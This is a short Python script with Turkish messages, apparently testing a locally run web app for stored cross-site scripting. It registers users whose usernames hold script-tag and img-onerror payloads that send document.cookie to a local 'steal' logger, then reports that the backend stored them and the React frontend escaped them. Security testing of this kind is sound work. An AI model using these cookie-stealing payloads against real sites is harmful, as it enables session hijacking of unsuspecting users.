"""
XSS Test Script - Basit kullanım
Sadece: py quick_xss_test.py
"""

import requests
import json
from config import API_URL

print("🔴 XSS Test Başlatılıyor...\n")

# Test 1: Script tag XSS
print("📤 Test 1: Script tag ile XSS...")
payload1 = {
    "username": "<script>fetch('http://localhost:3001/steal?c='+document.cookie)</script>",
    "email": "xss1@test.com",
    "password": "Test1234!",
    "full_name": "XSS Test"
}

try:
    r1 = requests.post(f"{API_URL}/auth/register", json=payload1)
    print(f"✅ Status: {r1.status_code}")
    if r1.status_code == 201:
        print(f"✅ Kullanıcı oluşturuldu!")
        print(f"📝 Response: {r1.json()}")
    elif r1.status_code == 400:
        print(f"⚠️ Kullanıcı zaten var veya hata: {r1.text}")
except Exception as e:
    print(f"❌ Hata: {e}")

print("\n" + "="*50 + "\n")

# Test 2: Image onerror XSS
print("📤 Test 2: Image onerror ile XSS...")
payload2 = {
    "username": '<img src=x onerror="fetch(\'http://localhost:3001/steal?c=\'+document.cookie)">',
    "email": "xss2@test.com",
    "password": "Test1234!",
    "full_name": "XSS Test 2"
}

try:
    r2 = requests.post(f"{API_URL}/auth/register", json=payload2)
    print(f"✅ Status: {r2.status_code}")
    if r2.status_code == 201:
        print(f"✅ Kullanıcı oluşturuldu!")
    elif r2.status_code == 400:
        print(f"⚠️ Kullanıcı zaten var")
except Exception as e:
    print(f"❌ Hata: {e}")

print("\n" + "="*50 + "\n")

# Test 3: Logger kontrolü
print("📊 Logger istatistikleri:")
try:
    stats = requests.get("http://localhost:3001/stats")
    print(json.dumps(stats.json(), indent=2))
except Exception as e:
    print(f"❌ Logger'a bağlanılamadı: {e}")

print("\n" + "="*50)
print("\n✅ Test Tamamlandı!")
print("\n📋 SONUÇ:")
print("1. ✅ XSS payload'ları backend'e gönderildi")
print("2. ❌ Backend payload'ları VERİTABANINA kaydetti (VULNERABLE!)")
print("3. ✅ React frontend escape etti (şimdilik güvenli)")
print("4. ℹ️  Logger'da 0 saldırı çünkü frontend engelledi")

print("\n🔍 ŞİMDİ NE YAPMALISINIZ?")
print("1. Tarayıcıda http://localhost:3000 açın")
print("2. Login olun (xss1@test.com / Test1234!)")
print("3. Sağ üst profil menüsünü açın")
print("4. Username'in TEXT olarak göründüğünü görün")
print("   (HTML olarak render edilmedi = XSS çalışmadı)")

print("\n🌐 Logger: http://localhost:3001")
print("📊 Stats: http://localhost:3001/stats")
